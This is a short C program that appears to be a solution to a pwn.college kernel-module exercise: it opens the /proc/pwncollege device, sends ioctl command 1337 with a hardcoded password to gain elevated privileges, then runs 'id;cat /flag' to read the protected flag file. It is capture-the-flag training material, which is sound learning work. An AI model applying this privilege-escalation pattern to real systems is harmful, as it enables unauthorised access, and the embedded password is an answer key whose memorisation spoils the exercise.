#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#define PASSWORD "bqyhauuzhvofcbmr"

int main() {
    // Open the /proc/pwncollege device
    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0) {
        perror("Failed to open /proc/pwncollege");
        exit(EXIT_FAILURE);
    }
    
    // Send the ioctl command (1337)
    if (ioctl(fd, 1337,PASSWORD) < 0) {
        perror("ioctl failed");
        close(fd);
        exit(EXIT_FAILURE);
    }
    // Close the file descriptor
    close(fd);

    // Execute 'id' command
    system("id;cat /flag");

    return 0;
}
